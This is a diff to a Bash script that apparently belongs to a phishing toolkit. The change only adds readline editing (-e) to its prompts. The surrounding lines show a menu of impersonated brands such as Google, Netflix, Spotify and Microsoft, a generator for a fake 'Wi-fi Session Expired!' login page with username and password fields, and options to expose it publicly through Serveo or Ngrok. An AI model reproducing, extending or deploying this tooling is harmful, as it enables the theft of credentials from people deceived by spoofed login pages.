@@ -51,7 +51,7 @@ printf "\e[1;92m[\e[0m\e[1;77m6\e[0m\e[1;92m]\e[0m\e[1;93m Google\e[0m         \
 printf "\e[1;92m[\e[0m\e[1;77m7\e[0m\e[1;92m]\e[0m\e[1;93m Spotify\e[0m        \e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;93m Microsoft\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m8\e[0m\e[1;92m]\e[0m\e[1;93m Netflix\e[0m        \e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;93m Origin\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m9\e[0m\e[1;92m]\e[0m\e[1;93m InstaFollow\e[0m    \e[1;92m[\e[0m\e[1;77m18\e[0m\e[1;92m]\e[0m\e[1;93m Pinterest\e[0m\n"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose an option: \e[0m\en' option
+read -e -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose an option: \e[0m\en' option
 
 
 if [[ $option == 1 || $option == 01 ]]; then
@@ -180,19 +180,19 @@ default_user_text="Username:"
 default_pass_text="Password:"
 default_sub_text="Log-In"
 
-read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Title 1 (Default: \e[0m\e[1;77mWi-fi Session Expired!\e[0m\e[1;92m): \e[0m' cap1
+read -e -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Title 1 (Default: \e[0m\e[1;77mWi-fi Session Expired!\e[0m\e[1;92m): \e[0m' cap1
 cap1="${cap1:-${default_cap1}}"
 
-read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Title 2 (Default: \e[0m\e[1;77mPlease login again.\e[0m\e[1;92m): \e[0m' cap2
+read -e -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Title 2 (Default: \e[0m\e[1;77mPlease login again.\e[0m\e[1;92m): \e[0m' cap2
 cap2="${cap2:-${default_cap2}}"
 
-read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Username field (Default: \e[0m\e[1;77mUsername:\e[0m\e[1;92m): \e[0m' user_text
+read -e -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Username field (Default: \e[0m\e[1;77mUsername:\e[0m\e[1;92m): \e[0m' user_text
 user_text="${user_text:-${default_user_text}}"
 
-read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Password field (Default: \e[0m\e[1;77mPassword:\e[0m\e[1;92m): \e[0m' pass_text
+read -e -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Password field (Default: \e[0m\e[1;77mPassword:\e[0m\e[1;92m): \e[0m' pass_text
 pass_text="${pass_text:-${default_pass_text}}"
 
-read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Submit field (Default: \e[0m\e[1;77mLog-In\e[0m\e[1;92m): \e[0m' sub_text
+read -e -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Submit field (Default: \e[0m\e[1;77mLog-In\e[0m\e[1;92m): \e[0m' sub_text
 sub_text="${sub_text:-${default_sub_text}}"
 
 echo "<!DOCTYPE html>" > sites/create/login.html
@@ -345,7 +345,7 @@ fi
 
 default_port="3333" #$(seq 1111 4444 | sort -R | head -n1)
 printf '\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a port (Default:\e[0m\e[1;77m %s\e[0m\e[1;92m): \e[0m' $default_port
-read port
+read -e port
 port="${port:-${default_port}}"
 serverx
 
@@ -421,7 +421,7 @@ printf "\n"
 printf "\e[1;92m[\e[0m\e[1;77m1\e[0m\e[1;92m]\e[0m\e[1;93m Serveo\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m2\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
 default_option_server="1"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose portfwd service: \e[0m\en' option_server
+read -e -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose portfwd service: \e[0m\en' option_server
 option_server="${option_server:-${default_option_server}}"
 if [[ $option_server == 1 || $option_server == 01 ]]; then
 startx
